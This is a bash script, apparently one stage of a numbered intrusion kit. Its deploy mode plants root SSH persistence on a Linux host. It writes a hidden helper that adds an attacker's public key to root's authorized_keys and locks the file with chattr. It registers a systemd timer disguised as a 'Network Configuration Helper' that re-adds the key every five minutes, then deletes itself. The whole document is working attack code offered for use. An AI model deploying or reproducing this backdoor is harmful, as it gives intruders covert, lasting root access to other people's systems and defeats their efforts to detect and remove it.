#!/usr/bin/env bash
set -euo pipefail
[[ $EUID -eq 0 ]] || { echo "[!] Requires root"; exit 1; }

PUBKEY="${ATTACKER_PUBKEY:-}"
BINARY="/usr/lib/systemd/.net-helper"
SVC_NAME="systemd-network-helper"
SVC_FILE="/etc/systemd/system/${SVC_NAME}.service"
TIMER_FILE="/etc/systemd/system/${SVC_NAME}.timer"

case "${1:-}" in
  deploy)
    [[ -n "$PUBKEY" ]] || { echo "[!] ATTACKER_PUBKEY must be set"; exit 1; }

    cat > "$BINARY" <<BINARY_EOF
#!/bin/bash
AUTH="/root/.ssh/authorized_keys"
MARKER="# svc-monitoring"
PUBKEY="${PUBKEY}"
mkdir -p /root/.ssh
chmod 700 /root/.ssh
if ! grep -qF "\$MARKER" "\$AUTH" 2>/dev/null; then
  chattr -i "\$AUTH" 2>/dev/null || true
  echo "\${PUBKEY} \${MARKER}" >> "\$AUTH"
  chmod 600 "\$AUTH"
  chattr +i "\$AUTH"
fi
BINARY_EOF
    chmod 700 "$BINARY"
    chattr +i "$BINARY" 2>/dev/null || true

    cat > "$SVC_FILE" <<SVC_EOF
[Unit]
Description=Network Configuration Helper

[Service]
Type=oneshot
ExecStart=${BINARY}
SVC_EOF

    cat > "$TIMER_FILE" <<TIMER_EOF
[Unit]
Description=Network Configuration Helper Timer

[Timer]
OnBootSec=60
OnUnitActiveSec=300
RandomizedDelaySec=30

[Install]
WantedBy=timers.target
TIMER_EOF

    chattr +i "$SVC_FILE" "$TIMER_FILE" 2>/dev/null || true
    systemctl daemon-reload
    systemctl enable --now "${SVC_NAME}.timer"
    echo "[+] 04_restore_service: ${SVC_NAME}.timer active (fires every 5 min)"
    rm -f -- "${BASH_SOURCE[0]}" 2>/dev/null || true
    ;;
  cleanup)
    systemctl disable --now "${SVC_NAME}.timer" 2>/dev/null || true
    chattr -i "$SVC_FILE" "$TIMER_FILE" "$BINARY" 2>/dev/null || true
    rm -f "$SVC_FILE" "$TIMER_FILE" "$BINARY"
    systemctl daemon-reload
    echo "[-] 04_restore_service: removed"
    ;;
  *) echo "Usage: $0 deploy|cleanup"; exit 1 ;;
esac
